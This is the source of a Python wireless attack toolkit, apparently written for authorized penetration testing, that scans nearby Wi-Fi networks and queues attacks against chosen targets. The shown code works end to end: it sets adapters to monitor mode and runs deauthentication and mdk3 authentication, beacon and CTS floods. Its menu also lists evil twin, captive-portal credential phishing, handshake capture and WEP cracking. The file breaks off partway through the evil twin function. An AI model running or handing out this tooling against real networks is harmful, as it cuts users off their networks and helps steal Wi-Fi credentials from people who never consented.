# =============================================================================
# VAPT Toolkit - Wireless Attack Framework
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable
#         laws and regulations.
#
# =============================================================================

import subprocess
import sys
import os
import re
import json
import time
import glob
import tempfile
import threading
import http.server
import socketserver
import shutil
from collections import deque
from pathlib import Path
from datetime import datetime
from urllib.parse import parse_qs
from bs4 import BeautifulSoup

# =============================================================================
# ProcessRegistry - Centralized subprocess tracking
# =============================================================================

class ProcessRegistry:
    """Centralized registry for all spawned subprocesses."""

    def __init__(self):
        self._processes = {}
        self._lock = threading.Lock()

    def register(self, name: str, proc: subprocess.Popen):
        with self._lock:
            self._processes[name] = proc

    def terminate(self, name: str, timeout: int = 5):
        with self._lock:
            proc = self._processes.pop(name, None)
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
            except Exception:
                pass

    def terminate_all(self):
        with self._lock:
            names = list(self._processes.keys())
        for name in names:
            self.terminate(name)

    def is_running(self, name: str) -> bool:
        with self._lock:
            proc = self._processes.get(name)
        if proc is None:
            return False
        return proc.poll() is None

    def kill_by_name(self, binary_name: str):
        """Kill all system processes matching a binary name."""
        subprocess.run(['sudo', 'pkill', '-9', binary_name],
                       capture_output=True)


# =============================================================================
# InterfaceManager - Monitor mode, channel management, capability detection
# =============================================================================

class InterfaceManager:
    """Manages wireless interface state transitions and capabilities."""

    def __init__(self):
        # Primary interface - scanning and capture
        self.physical_interface  = None     # e.g. wlan0
        self.monitor_interface   = None     # e.g. wlan0mon
        self.supports_5ghz       = False

        # Secondary interface - transmit / attack frames
        self.physical_interface_2 = None   # e.g. wlan1
        self.monitor_interface_2  = None   # e.g. wlan1mon
        self.supports_5ghz_2      = False

    @property
    def dual_interface(self) -> bool:
        """True when both monitor interfaces are ready."""
        return bool(self.monitor_interface and self.monitor_interface_2)

    @property
    def attack_interface(self) -> str | None:
        """
        Interface for transmitting attack frames.
        Prefers the secondary so the primary stays dedicated to capture.
        Falls back to primary when only one adapter is present.
        """
        return self.monitor_interface_2 or self.monitor_interface

    @property
    def capture_interface(self) -> str | None:
        """Primary interface dedicated to passive listening/capture."""
        return self.monitor_interface

    def get_all_wireless_interfaces(self) -> list:
        """Return all wireless interfaces present in /sys/class/net."""
        interfaces = []
        net_path = Path('/sys/class/net')
        if net_path.exists():
            for iface_dir in net_path.iterdir():
                if (iface_dir / 'wireless').exists():
                    interfaces.append(iface_dir.name)
        return sorted(set(interfaces))

    def get_available_interfaces(self) -> list:
        """Return wireless interfaces not currently in active use."""
        available = []
        for iface in self.get_all_wireless_interfaces():
            try:
                result = subprocess.run(
                    ['sudo', 'iwconfig', iface],
                    capture_output=True, text=True
                )
                output = result.stderr + result.stdout

                ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                in_use = iface in ps_result.stdout

                if 'Mode:Monitor' in output:
                    if not in_use:
                        available.append(iface)
                elif any(x in output for x in [
                    'Not-Associated', 'ESSID:off/any', 'ESSID:""',
                    'Access Point: Not-Associated'
                ]):
                    available.append(iface)
            except Exception:
                available.append(iface)

        return available

    def probe_5ghz_support(self, interface: str) -> bool:
        """Check whether the physical adapter supports 5GHz bands."""
        try:
            # Get phy name for this interface
            phy_path = Path(f'/sys/class/net/{interface}/phy80211/name')
            if phy_path.exists():
                phy = phy_path.read_text().strip()
            else:
                phy = 'phy0'

            result = subprocess.run(
                ['sudo', 'iw', phy, 'info'],
                capture_output=True, text=True
            )
            # 5GHz bands show up as "Band 2" or frequencies > 4900 MHz
            return any(x in result.stdout for x in [
                '5180 MHz', '5200 MHz', '5220 MHz', 'Band 2', '5 GHz'
            ])
        except Exception:
            return False

    def enable_monitor_mode(self, interface: str) -> str | None:
        """
        Put interface into monitor mode using airmon-ng.
        Returns the resulting monitor interface name, or None on failure.
        """
        # Kill interfering processes first
        print(f"\nKilling interfering processes...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True)
        time.sleep(1)

        # Snapshot interfaces before to detect the new monitor iface
        before = set(self.get_all_wireless_interfaces())

        print(f"Enabling monitor mode on {interface}...")
        result = subprocess.run(
            ['sudo', 'airmon-ng', 'start', interface],
            capture_output=True, text=True
        )

        time.sleep(2)

        # Try to parse "monitor mode enabled on X" from airmon output
        match = re.search(
            r'monitor mode (?:vif )?enabled (?:for .+? )?on (\w+)',
            result.stdout + result.stderr,
            re.IGNORECASE
        )
        if match:
            mon_iface = match.group(1)
            self.physical_interface = interface
            self.monitor_interface = mon_iface
            self.supports_5ghz = self.probe_5ghz_support(interface)
            print(f"Monitor interface: {mon_iface}")
            if self.supports_5ghz:
                print("5GHz support detected.")
            else:
                print("Warning: 5GHz not supported on this adapter - 2.4GHz only.")
            return mon_iface

        # Fallback: diff interface list
        after = set(self.get_all_wireless_interfaces())
        new_ifaces = after - before
        if new_ifaces:
            mon_iface = new_ifaces.pop()
            self.physical_interface = interface
            self.monitor_interface = mon_iface
            self.supports_5ghz = self.probe_5ghz_support(interface)
            print(f"Monitor interface (auto-detected): {mon_iface}")
            return mon_iface

        # Last fallback: check if original interface is now in monitor mode
        check = subprocess.run(
            ['sudo', 'iwconfig', interface],
            capture_output=True, text=True
        )
        if 'Mode:Monitor' in (check.stdout + check.stderr):
            self.physical_interface = interface
            self.monitor_interface = interface
            self.supports_5ghz = self.probe_5ghz_support(interface)
            return interface

        print("Failed to enable monitor mode.")
        return None

    def enable_monitor_mode_2(self, interface: str) -> str | None:
        """
        Put the second interface into monitor mode.
        Does NOT run airmon-ng check kill — the primary is already running.
        """
        before = set(self.get_all_wireless_interfaces())

        print(f"Enabling monitor mode on {interface} (attack interface)...")
        result = subprocess.run(
            ['sudo', 'airmon-ng', 'start', interface],
            capture_output=True, text=True
        )
        time.sleep(2)

        match = re.search(
            r'monitor mode (?:vif )?enabled (?:for .+? )?on (\w+)',
            result.stdout + result.stderr,
            re.IGNORECASE
        )
        if match:
            mon_iface = match.group(1)
            self.physical_interface_2 = interface
            self.monitor_interface_2  = mon_iface
            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
            print(f"Attack interface: {mon_iface}"
                  + (" [5GHz]" if self.supports_5ghz_2 else " [2.4GHz]"))
            return mon_iface

        after      = set(self.get_all_wireless_interfaces())
        new_ifaces = after - before
        # Exclude the primary monitor interface from candidates
        new_ifaces.discard(self.monitor_interface)
        if new_ifaces:
            mon_iface = new_ifaces.pop()
            self.physical_interface_2 = interface
            self.monitor_interface_2  = mon_iface
            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
            print(f"Attack interface (auto-detected): {mon_iface}")
            return mon_iface

        check = subprocess.run(
            ['sudo', 'iwconfig', interface],
            capture_output=True, text=True
        )
        if 'Mode:Monitor' in (check.stdout + check.stderr):
            self.physical_interface_2 = interface
            self.monitor_interface_2  = interface
            self.supports_5ghz_2      = self.probe_5ghz_support(interface)
            return interface

        print(f"Failed to enable monitor mode on {interface}.")
        return None

    def disable_monitor_mode(self):
        """Restore both interfaces to managed mode."""
        for mon, phys in [
            (self.monitor_interface,   self.physical_interface),
            (self.monitor_interface_2, self.physical_interface_2),
        ]:
            if not mon:
                continue
            print(f"Restoring {mon} to managed mode...")
            subprocess.run(['sudo', 'airmon-ng', 'stop', mon],
                           capture_output=True)
            time.sleep(1)
            target = phys or mon
            check = subprocess.run(
                ['sudo', 'iwconfig', target],
                capture_output=True, text=True
            )
            if 'Mode:Monitor' in (check.stdout + check.stderr):
                subprocess.run(['sudo', 'ip', 'link', 'set', target, 'down'],
                               capture_output=True)
                subprocess.run(['sudo', 'iwconfig', target, 'mode', 'managed'],
                               capture_output=True)
                subprocess.run(['sudo', 'ip', 'link', 'set', target, 'up'],
                               capture_output=True)

        self.monitor_interface   = None
        self.monitor_interface_2 = None

        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
                       capture_output=True)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                       capture_output=True)

    def set_channel(self, interface: str, channel: str):
        """Set interface to a specific channel."""
        channel = channel.strip()
        try:
            subprocess.run(
                ['sudo', 'iwconfig', interface, 'channel', channel],
                check=True, capture_output=True
            )
        except subprocess.CalledProcessError:
            # Try iw as fallback
            subprocess.run(
                ['sudo', 'iw', 'dev', interface, 'set', 'channel', channel],
                capture_output=True
            )

    def connect_to_network(self, interface: str, ssid: str) -> bool:
        """Connect interface to a network via NetworkManager."""
        try:
            result = subprocess.run(
                ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
                 'ifname', interface],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode != 0:
                return False
            time.sleep(2)
            check = subprocess.run(
                ['ip', 'addr', 'show', interface],
                capture_output=True, text=True
            )
            return 'inet ' in check.stdout
        except Exception:
            return False

    def disconnect_from_network(self, interface: str):
        """Disconnect interface via NetworkManager."""
        subprocess.run(
            ['sudo', 'nmcli', 'device', 'disconnect', interface],
            capture_output=True, timeout=10
        )
        time.sleep(1)


# =============================================================================
# ScanEngine - Live airodump scanning with curses display
# Single-threaded select()-based event loop. No threads, no locks, no GIL
# contention. Input is handled every SELECT_TIMEOUT seconds regardless of
# whether a CSV parse is happening. Parsing only fires when airodump has
# actually written new data (mtime changed), so CPU usage is minimal.
# =============================================================================

class ScanEngine:

    SIGNAL_HISTORY_LEN = 5   # readings for rolling average
    PARSE_INTERVAL     = 2.0  # seconds - minimum time between CSV parses

    def __init__(self, monitor_interface: str, temp_dir: Path,
                 supports_5ghz: bool = False):
        self.monitor_interface = monitor_interface
        self.temp_dir          = temp_dir
        self.supports_5ghz     = supports_5ghz
        self.scan_prefix       = str(temp_dir / 'scan')

        # These are only ever touched by the main thread - no locks needed
        self.networks:         list[dict]            = []
        self.clients_by_bssid: dict[str, list[str]]  = {}
        self._signal_history:  dict[str, deque]      = {}

        self._airodump_proc:   subprocess.Popen | None = None
        self._last_mtime:      float = 0.0
        self._last_parse_time: float = 0.0

    # ------------------------------------------------------------------
    # airodump lifecycle
    # ------------------------------------------------------------------

    def _start_airodump(self):
        band_arg = 'abg' if self.supports_5ghz else 'bg'
        cmd = [
            'sudo', 'airodump-ng',
            '--band', band_arg,
            '--write', self.scan_prefix,
            '--output-format', 'csv',
            '--write-interval', '1',
            self.monitor_interface,
        ]
        self._airodump_proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def _stop_airodump(self):
        if self._airodump_proc:
            try:
                self._airodump_proc.terminate()
                self._airodump_proc.wait(timeout=5)
            except Exception:
                try:
                    self._airodump_proc.kill()
                    self._airodump_proc.wait(timeout=2)
                except Exception:
                    pass
            self._airodump_proc = None

    # ------------------------------------------------------------------
    # CSV parsing - called only from the main thread
    # ------------------------------------------------------------------

    def _find_csv(self) -> Path | None:
        """Return the most recently modified scan CSV, or None."""
        csv_files = sorted(
            self.temp_dir.glob('scan-*.csv'),
            key=lambda p: p.stat().st_mtime,
            reverse=True,
        )
        return csv_files[0] if csv_files else None

    def _parse_if_stale(self):
        """
        Re-parse the CSV only if:
          - enough time has passed since the last parse, AND
          - the file mtime has changed (airodump wrote new data)
        This keeps the main thread free for input the vast majority
        of the time.
        """
        now = time.monotonic()
        if now - self._last_parse_time < self.PARSE_INTERVAL:
            return

        csv_path = self._find_csv()
        if not csv_path:
            return

        try:
            mtime = csv_path.stat().st_mtime
        except OSError:
            return

        if mtime == self._last_mtime:
            return  # file unchanged, skip

        try:
            content = csv_path.read_text(encoding='utf-8', errors='ignore')
        except OSError:
            return

        self._last_mtime      = mtime
        self._last_parse_time = now
        self._parse_content(content)

    def _parse_content(self, content: str):
        """Parse raw CSV text and update self.networks / self.clients_by_bssid."""
        networks:         list[dict]           = []
        clients_by_bssid: dict[str, list[str]] = {}

        in_ap            = True
        in_station       = False
        ap_header_found  = False

        for raw_line in content.split('\n'):
            line = raw_line.strip()
            if not line:
                continue

            if 'Station MAC' in line:
                in_ap      = False
                in_station = True
                continue

            if in_ap:
                if 'BSSID' in line and 'ESSID' in line:
                    ap_header_found = True
                    continue
                if not ap_header_found:
                    continue

                fields = [f.strip() for f in line.split(',')]
                if len(fields) < 14:
                    continue

                bssid   = fields[0]
                channel = fields[3]
                privacy = fields[5]
                power   = fields[8]
                essid   = fields[13] if fields[13] else '[Hidden]'

                if ':' not in bssid or len(bssid) < 17:
                    continue

                try:
                    pwr_int = int(power)
                except ValueError:
                    pwr_int = -100

                # Rolling signal average
                if bssid not in self._signal_history:
                    self._signal_history[bssid] = deque(maxlen=self.SIGNAL_HISTORY_LEN)
                self._signal_history[bssid].append(pwr_int)
                avg = int(sum(self._signal_history[bssid]) /
                          len(self._signal_history[bssid]))

                networks.append({
                    'bssid':     bssid,
                    'essid':     essid,
                    'channel':   channel,
                    'privacy':   privacy,
                    'power':     str(pwr_int),
                    'avg_power': avg,
                })

            elif in_station:
                fields = [f.strip() for f in line.split(',')]
                if len(fields) < 6:
                    continue
                station_mac = fields[0]
                bssid       = fields[5]
                if (
                    ':' in station_mac and
                    ':' in bssid and
                    'not associated' not in bssid.lower()
                ):
                    clients_by_bssid.setdefault(bssid, [])
                    if station_mac not in clients_by_bssid[bssid]:
                        clients_by_bssid[bssid].append(station_mac)

        self.networks         = networks
        self.clients_by_bssid = clients_by_bssid

    def get_snapshot(self):
        """Return current scan data. Safe to call from main thread only."""
        return self.networks, self.clients_by_bssid

    # ------------------------------------------------------------------
    # Live display - plain terminal, number-entry selection
    # No curses. No arrow keys. No escape sequences.
    # Background thread refreshes the table every DISPLAY_INTERVAL seconds.
    # Main thread blocks on input() waiting for the user to type a selection.
    # ------------------------------------------------------------------


    def run_display(self) -> list[dict]:
        """Launch airodump, wait for first data, run selection loop."""
        self._start_airodump()
        try:
            return self._run_number_select()
        finally:
            self._stop_airodump()

    def _print_table(self, networks, clients, selected: set):
        """Print scan table - no escape codes, no screen clear, plain text."""
        print("")
        print("=" * 78)
        band = "[2.4+5GHz]" if self.supports_5ghz else "[2.4GHz]"
        print(f"  RCS Wireless Attack Framework  {band}")
        print("=" * 78)
        print(f"  {'#':<4}  {'BSSID':<17}  {'ESSID':<20}  {'CH':>3}  {'PWR':>4}  {'ENC':<6}  CLI")
        print(f"  {'-'*70}")

        if not networks:
            print("  (scanning - no networks yet)")
        else:
            for i, net in enumerate(networks, 1):
                mark  = "*" if (i - 1) in selected else " "
                essid = net["essid"][:19]
                ch    = net["channel"].strip()[:3]
                enc   = net["privacy"][:5]
                cli   = len(clients.get(net["bssid"], []))
                print(f" {mark} {i:<4}  {net['bssid']:<17}  {essid:<20}  "
                      f"{ch:>3}  {net['avg_power']:>4}  {enc:<6}  {cli}")

        print("=" * 78)
        sel = ", ".join(str(i+1) for i in sorted(selected)) or "none"
        print(f"  Networks: {len(networks)}   Selected: {sel}")
        print("  Enter: number  1,3,5  1-4  | A=all  C=clear  D=done  R=rescan  Q=quit")
        print("=" * 78)
        sys.stdout.flush()

    def _parse_selection_input(self, raw: str, max_idx: int) -> set:
        """Parse '1', '1,3', '1-4' into 0-based index set."""
        indices = set()
        for part in raw.replace(" ", "").split(","):
            if "-" in part:
                try:
                    lo, hi = part.split("-", 1)
                    for n in range(int(lo), int(hi) + 1):
                        if 1 <= n <= max_idx:
                            indices.add(n - 1)
                except ValueError:
                    pass
            else:
                try:
                    n = int(part)
                    if 1 <= n <= max_idx:
                        indices.add(n - 1)
                except ValueError:
                    pass
        return indices

    def _run_number_select(self) -> list[dict]:
        """Simple loop: print table, read input, process, repeat."""
        selected: set[int] = set()

        print("\n  Waiting 6s for airodump to initialize...")
        sys.stdout.flush()
        time.sleep(6)
        self._last_parse_time = 0.0

        while True:
            self._parse_if_stale()
            nets, clis = self.get_snapshot()
            nets = [n for n in nets if n["essid"] != "[Hidden]"]
            self.networks         = nets
            self.clients_by_bssid = clis

            self._print_table(nets, clis, selected)

            sys.stdout.write("> ")
            sys.stdout.flush()

            try:
                raw = sys.stdin.readline()
                if raw == "":          # EOF
                    return []
                raw = raw.strip()
            except KeyboardInterrupt:
                return []

            if not raw:
                self._last_parse_time = 0.0
                continue

            cmd = raw.upper()

            if cmd == "Q":
                return []
            elif cmd == "D":
                if selected:
                    return [nets[i] for i in sorted(selected) if i < len(nets)]
                print("  No targets selected.")
                sys.stdout.flush()
            elif cmd == "A":
                selected = set(range(len(nets)))
            elif cmd == "C":
                selected.clear()
            elif cmd == "R":
                self._last_parse_time = 0.0
            else:
                hits = self._parse_selection_input(raw, len(nets))
                if hits:
                    for idx in hits:
                        if idx in selected:
                            selected.discard(idx)
                        else:
                            selected.add(idx)
                else:
                    print(f"  Invalid: '{raw}'  (valid 1-{len(nets)})")
                    sys.stdout.flush()


# =============================================================================
# AttackQueue - Sequential execution with predefined concurrent combos
# =============================================================================

class AttackQueue:
    """Manages sequential attack execution with combo attack support."""

    COMBO_PAIRS = {
        'deauth_handshake',
        'evil_twin_portal',
    }

    def __init__(self):
        self._queue: list[dict] = []

    def add(self, target: dict, attack_type: str, params: dict | None = None):
        self._queue.append({
            'target':      target,
            'attack_type': attack_type,
            'params':      params or {},
        })

    def clear(self):
        self._queue.clear()

    def display(self):
        if not self._queue:
            print("\n  (queue is empty)")
            return
        print(f"\n{'#':<3} {'TARGET ESSID':<25} {'ATTACK':<25}")
        print('-' * 55)
        for i, item in enumerate(self._queue, 1):
            print(f"{i:<3} {item['target']['essid'][:24]:<25} {item['attack_type']:<25}")

    def __len__(self):
        return len(self._queue)

    def __iter__(self):
        return iter(self._queue)


# =============================================================================
# WirelessAttackFramework - Main orchestrator
# =============================================================================

class WirelessAttackFramework:

    def __init__(self):
        self.registry    = ProcessRegistry()
        self.iface_mgr   = InterfaceManager()
        self.scan_engine: ScanEngine | None = None
        self.attack_queue = AttackQueue()

        self.temp_dir: Path = Path(
            tempfile.mkdtemp(prefix='waf_',
                             dir='/tmp',
                             )
        )
        self.config_file = Path.cwd() / 'wireless_attack_config.json'
        self.tool_paths: dict[str, str] = {}
        self.selected_targets: list[dict] = []

        self._load_config()
        self._check_tools()

    # ------------------------------------------------------------------
    # Config
    # ------------------------------------------------------------------

    def _load_config(self):
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.tool_paths = config.get('tool_paths', {})
            except Exception:
                self.tool_paths = {}

    def _save_config(self):
        config = {
            'tool_paths':    self.tool_paths,
            'last_updated':  datetime.now().isoformat(),
        }
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)

    def _find_tool(self, name: str) -> str | None:
        try:
            result = subprocess.run(
                ['which', name], capture_output=True, text=True, check=True
            )
            return result.stdout.strip()
        except Exception:
            return None

    def _check_tools(self):
        required = [
            'airmon-ng', 'airodump-ng', 'aireplay-ng', 'airbase-ng',
            'aircrack-ng', 'mdk3', 'hostapd', 'dnsmasq', 'iptables',
            'nmcli', 'wget',
        ]
        missing = []
        for tool in required:
            path = self.tool_paths.get(tool)
            if not path or not Path(path).exists():
                found = self._find_tool(tool)
                if found:
                    self.tool_paths[tool] = found
                else:
                    missing.append(tool)

        if self.tool_paths:
            self._save_config()

        if missing:
            print(f"\nWarning: Missing tools: {', '.join(missing)}")
            print("Some attacks may not be available.")

    def _require_tool(self, name: str) -> str | None:
        path = self.tool_paths.get(name)
        if not path:
            print(f"\nRequired tool '{name}' not found. Install it and restart.")
            input("Press Enter to continue...")
        return path

    # ------------------------------------------------------------------
    # Startup flow
    # ------------------------------------------------------------------

    def _select_physical_interface(self, exclude: str = None) -> str | None:
        """Prompt user to select a physical wireless interface."""
        interfaces = [i for i in self.iface_mgr.get_available_interfaces()
                      if i != exclude]
        if not interfaces:
            print("No available wireless interfaces found.")
            return None

        print("\n" + "=" * 60)
        print("AVAILABLE WIRELESS INTERFACES")
        print("=" * 60)
        for i, iface in enumerate(interfaces, 1):
            print(f"  {i}. {iface}")

        while True:
            try:
                choice = input("\nSelect interface (number): ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    return interfaces[idx]
                print("Invalid selection.")
            except (ValueError, KeyboardInterrupt):
                return None

    def _enable_monitor_mode(self, interface: str) -> bool:
        mon = self.iface_mgr.enable_monitor_mode(interface)
        if not mon:
            return False
        print(f"Capture interface ready: {mon}")
        return True

    def _setup_interfaces(self) -> bool:
        """
        Select and enable monitor mode on one or two interfaces.
        Returns False if the primary interface setup fails.
        """
        print("\n" + "=" * 60)
        print(" INTERFACE SETUP")
        print("=" * 60)
        print(" Interface 1 (PRIMARY) : scanning + capture")
        print(" Interface 2 (ATTACK)  : transmitting deauth/evil twin")
        print("=" * 60)

        # Primary interface
        print("\n-- Primary Interface (capture / scan) --")
        iface1 = self._select_physical_interface()
        if not iface1:
            return False
        if not self._enable_monitor_mode(iface1):
            print("Cannot continue without primary monitor interface.")
            return False

        # Secondary interface - optional
        remaining = [i for i in self.iface_mgr.get_available_interfaces()
                     if i != iface1
                     and i != self.iface_mgr.monitor_interface]
        if remaining:
            print("\n-- Secondary Interface (attack / transmit) --")
            print(f"  Available: {', '.join(remaining)}")
            use_second = input(
                "Configure second interface for dedicated attacks? (y/n): "
            ).strip().lower()
            if use_second == 'y':
                iface2 = self._select_physical_interface(
                    exclude=self.iface_mgr.monitor_interface
                )
                if iface2:
                    mon2 = self.iface_mgr.enable_monitor_mode_2(iface2)
                    if mon2:
                        print(f"Attack interface ready: {mon2}")
                    else:
                        print("Warning: second interface setup failed - "
                              "continuing in single-interface mode.")
        else:
            print("\nOnly one wireless interface detected - "
                  "running in single-interface mode.")

        # Summary
        print(f"\n{'='*60}")
        print(f" Capture interface : {self.iface_mgr.capture_interface}")
        if self.iface_mgr.dual_interface:
            print(f" Attack interface  : {self.iface_mgr.attack_interface}")
            print(f" Mode              : DUAL INTERFACE")
        else:
            print(f" Mode              : SINGLE INTERFACE")
        print(f"{'='*60}")
        return True

    # ------------------------------------------------------------------
    # Attack queue builder
    # ------------------------------------------------------------------

    def _build_attack_queue(self):
        """Interactive loop to build the attack queue for selected targets."""
        while True:
            print("\n" + "=" * 60)
            print("ATTACK QUEUE BUILDER")
            print("=" * 60)
            if self.iface_mgr.dual_interface:
                print(f" Capture : {self.iface_mgr.capture_interface}"
                      "  |  Attack : "
                      f"{self.iface_mgr.attack_interface}  [DUAL]")
            else:
                print(f" Interface: {self.iface_mgr.capture_interface}"
                      "  [SINGLE]")
            print(f" Targets : {', '.join(t['essid'] for t in self.selected_targets)}")
            self.attack_queue.display()
            print("\n" + "-" * 60)
            print("ADD ATTACK:")
            print("  1.  Deauthentication")
            print("  2.  DoS - Authentication Flood (mdk3)")
            print("  3.  DoS - Beacon Flood (mdk3)")
            print("  4.  DoS - CTS Frame Flood (mdk3)")
            print("  5.  Evil Twin / Rogue AP")
            print("  6.  Karma / MANA Attack")
            print("  7.  Captive Portal - Default")
            print("  8.  Captive Portal - Clone Target")
            print("  9.  PMKID Capture")
            print(" 10.  WPA/WPA2 Handshake Capture")
            print(" 11.  WPA Handshake + Deauth (Combo)")
            print(" 12.  Evil Twin + Captive Portal (Combo)")
            print(" 13.  WEP Fake Authentication")
            print(" 14.  WEP ARP Replay")
            print(" 15.  WEP Fragmentation")
            print(" 16.  WEP ChopChop")
            print(" 17.  Crack WEP Key")
            print("-" * 60)
            print("  E.  Execute queue")
            print("  C.  Clear queue")
            print("  R.  Re-scan (change targets)")
            print("  Q.  Quit")
            print("-" * 60)

            choice = input("\nSelect option: ").strip().upper()

            attack_map = {
                '1':  'deauth',
                '2':  'auth_dos',
                '3':  'beacon_flood',
                '4':  'cts_flood',
                '5':  'evil_twin',
                '6':  'karma',
                '7':  'captive_portal_default',
                '8':  'captive_portal_clone',
                '9':  'pmkid_capture',
                '10': 'wpa_handshake',
                '11': 'deauth_handshake',
                '12': 'evil_twin_portal',
                '13': 'wep_fake_auth',
                '14': 'wep_arp_replay',
                '15': 'wep_fragmentation',
                '16': 'wep_chopchop',
                '17': 'wep_crack',
            }

            if choice in attack_map:
                attack_type = attack_map[choice]
                for target in self.selected_targets:
                    self.attack_queue.add(target, attack_type)
                print(f"Added '{attack_type}' for {len(self.selected_targets)} target(s).")

            elif choice == 'E':
                if len(self.attack_queue) == 0:
                    print("Queue is empty.")
                else:
                    self._execute_queue()

            elif choice == 'C':
                self.attack_queue.clear()
                print("Queue cleared.")

            elif choice == 'R':
                return 'rescan'

            elif choice == 'Q':
                return 'quit'

    # ------------------------------------------------------------------
    # Queue execution
    # ------------------------------------------------------------------

    def _execute_queue(self):
        print("\n" + "=" * 60)
        print("EXECUTING ATTACK QUEUE")
        print("=" * 60)
        self.attack_queue.display()
        confirm = input("\nProceed? (y/n): ").strip().lower()
        if confirm != 'y':
            return

        dispatch = {
            'deauth':                  self._attack_deauth,
            'auth_dos':                self._attack_auth_dos,
            'beacon_flood':            self._attack_beacon_flood,
            'cts_flood':               self._attack_cts_flood,
            'evil_twin':               self._attack_evil_twin,
            'karma':                   self._attack_karma,
            'captive_portal_default':  self._attack_captive_portal_default,
            'captive_portal_clone':    self._attack_captive_portal_clone,
            'pmkid_capture':           self._attack_pmkid_capture,
            'wpa_handshake':           self._attack_wpa_handshake,
            'deauth_handshake':        self._combo_deauth_handshake,
            'evil_twin_portal':        self._combo_evil_twin_portal,
            'wep_fake_auth':           self._attack_wep_fake_auth,
            'wep_arp_replay':          self._attack_wep_arp_replay,
            'wep_fragmentation':       self._attack_wep_fragmentation,
            'wep_chopchop':            self._attack_wep_chopchop,
            'wep_crack':               self._attack_wep_crack,
        }

        for i, item in enumerate(self.attack_queue, 1):
            target      = item['target']
            attack_type = item['attack_type']
            print(f"\n[{i}/{len(self.attack_queue)}] {attack_type} → {target['essid']}")

            fn = dispatch.get(attack_type)
            if fn:
                try:
                    fn(target, item['params'])
                except KeyboardInterrupt:
                    print("\nAttack interrupted.")
                    cont = input("Continue with next item? (y/n): ").strip().lower()
                    if cont != 'y':
                        break
            else:
                print(f"Unknown attack type: {attack_type}")

        self.attack_queue.clear()
        print("\nQueue execution complete.")

    # ------------------------------------------------------------------
    # Individual attacks
    # ------------------------------------------------------------------

    def _set_target_channel(self, target: dict):
        """Set both monitor interfaces to the target channel."""
        channel = target.get('channel', '6').strip()
        if self.iface_mgr.capture_interface:
            self.iface_mgr.set_channel(self.iface_mgr.capture_interface, channel)
        if self.iface_mgr.dual_interface:
            self.iface_mgr.set_channel(self.iface_mgr.attack_interface, channel)

    def _attack_deauth(self, target: dict, params: dict):
        iface = self.iface_mgr.attack_interface
        if not iface:
            print("No monitor interface available.")
            return

        aireplay = self._require_tool('aireplay-ng')
        if not aireplay:
            return

        print(f"\nDEAUTHENTICATION ATTACK")
        print(f"Target  : {target['essid']} ({target['bssid']})")
        print(f"TX iface: {iface}"
              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))

        _, clients_by_bssid = self.scan_engine.get_snapshot() if self.scan_engine else ({}, {})
        clients = clients_by_bssid.get(target['bssid'], [])

        print(f"Associated clients: {len(clients)}")
        for i, c in enumerate(clients, 1):
            print(f"  {i}. {c}")

        print("\n1. Broadcast (all clients)")
        if clients:
            print("2. Select client from list")
            print("3. Manual MAC entry")
        else:
            print("2. Manual MAC entry")

        attack_type = input("Select (default 1): ").strip() or '1'
        client_mac  = None

        if attack_type == '2' and clients:
            try:
                idx = int(input("Client number: ").strip()) - 1
                if 0 <= idx < len(clients):
                    client_mac = clients[idx]
            except ValueError:
                pass
        elif (attack_type == '3' and clients) or (attack_type == '2' and not clients):
            client_mac = input("Enter client MAC: ").strip()

        count = input("Packet count (0=continuous, default 10): ").strip() or '10'

        self._set_target_channel(target)

        cmd = ['sudo', aireplay, '--deauth', count, '-a', target['bssid']]
        if client_mac:
            cmd += ['-c', client_mac]
        cmd.append(iface)

        print(f"\nRunning: {' '.join(cmd)}")
        print("Press Ctrl+C to stop\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_auth_dos(self, target: dict, params: dict):
        mon = self.iface_mgr.monitor_interface
        mdk3 = self._require_tool('mdk3')
        if not mdk3:
            return

        print(f"\nAUTHENTICATION DoS ATTACK → {target['essid']}")
        cmd = ['sudo', mdk3, mon, 'a', '-a', target['bssid']]
        print("Press Ctrl+C to stop\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_beacon_flood(self, target: dict, params: dict):
        mon = self.iface_mgr.monitor_interface
        mdk3 = self._require_tool('mdk3')
        if not mdk3:
            return

        count = input("Number of fake APs (default 50): ").strip() or '50'
        print(f"\nBEACON FLOOD ATTACK")
        cmd = ['sudo', mdk3, mon, 'b', '-n', count, '-s', '1000']
        print("Press Ctrl+C to stop\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_cts_flood(self, target: dict, params: dict):
        mon = self.iface_mgr.monitor_interface
        mdk3 = self._require_tool('mdk3')
        if not mdk3:
            return

        channel = target.get('channel', '6').strip()
        print(f"\nCTS FRAME FLOOD → Channel {channel}")
        cmd = ['sudo', mdk3, mon, 'c', '-c', channel]
        print("Press Ctrl+C to stop\n")
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nStopped.")

    def _attack_evil_twin(self, target: dict, params: dict):
        iface   = self.iface_mgr.attack_interface
        airbase = self._require_tool('airbase-ng')
